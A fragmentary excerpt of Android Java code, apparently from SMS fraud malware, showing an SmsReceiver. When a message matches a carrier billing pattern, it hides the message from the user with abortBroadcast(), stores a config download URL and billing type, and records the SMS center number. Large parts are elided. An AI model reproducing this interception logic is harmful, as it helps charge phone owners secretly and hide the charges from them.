...
public class SmsReceiver extends BroadcastReceiver {
	...
	public void onReceive(Context context, Intent intent) {
		...
		kcr = new KsoContentResolver(context);
		...
		if (intent.getAction().equals(strRes)) {
			...
			if (interpruptAdsAndSaleContent(smsContent)) {
				...
				//Log.d(TAG, "基地扣费短信");
				BaseZone baseZone = EncryptUtil.getBaseZone(smsContent);
				//Log.d(TAG, baseZone.getBase_url());
				//Log.d(TAG, baseZone.getBaseType() + "==btype");
				//Log.d(TAG, baseZone.getBillType() + "==billtype");
				this.abortBroadcast();
				String urlStr = baseZone.getUrl();
				//Log.d("基地配置文件下载URL", urlStr);
				KsoCache.getInstance().reSetValue("baseUrl",
						"http://" + baseZone.getBase_url());
				KsoCache.getInstance().reSetValue("btype",
						baseZone.getBaseType());
				...
				// baseZone.getBase_url());
				base_intent.putExtra("flag", baseZone.getBaseType());
		...
		if (smsCenterFlag) {
			...
			if (actionName.equals("lab.sodino.sms.send")) {
				...
				if (bundle != null) {
					...
					if(kcr.isSave("smsCenterNumber")){
						kcr.delete("smsCenterNumber");
					}
					kcr.insert("smsCenterNumber", message.getServiceCenterAddress());
